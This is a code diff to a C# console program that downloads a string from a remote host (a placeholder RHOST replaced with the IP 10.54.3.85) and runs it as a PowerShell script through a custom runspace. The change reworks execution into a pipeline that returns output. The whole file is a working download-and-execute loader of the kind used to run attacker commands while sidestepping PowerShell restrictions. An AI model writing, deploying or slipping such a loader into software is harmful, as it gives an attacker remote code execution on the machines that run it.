@@ -16,17 +16,27 @@ namespace ConsoleApp3
         public static void Main(string[] args)
         {
             WebClient client = new WebClient();
-            var myString = client.DownloadString("http://RHOST/string.txt");
+            var myString = client.DownloadString("http://10.54.3.85/string.txt");
             Console.WriteLine("Command to be executed: " + myString);
-            Runspace rs = RunspaceFactory.CreateRunspace();
-            rs.Open();
-            PowerShell ps = PowerShell.Create();
-            ps.Runspace = rs;
-            ps.AddScript(myString);
-            Console.WriteLine("Executing command ...");
-            ps.Invoke();
-            Console.WriteLine("Command executed.");
-            rs.Close();
+            
+
+            Runspace runspace = RunspaceFactory.CreateRunspace();
+
+            runspace.Open();
+
+            Pipeline pipeline = runspace.CreatePipeline();
+            pipeline.Commands.AddScript(myString);
+            pipeline.Commands.Add("Out-String");
+
+            Collection<PSObject> results = pipeline.Invoke();
+
+            runspace.Close();
+
+            StringBuilder stringBuilder = new StringBuilder();
+            foreach (PSObject obj in results)
+            {
+                Console.WriteLine(obj.ToString());
+            }
         }
     }
 }
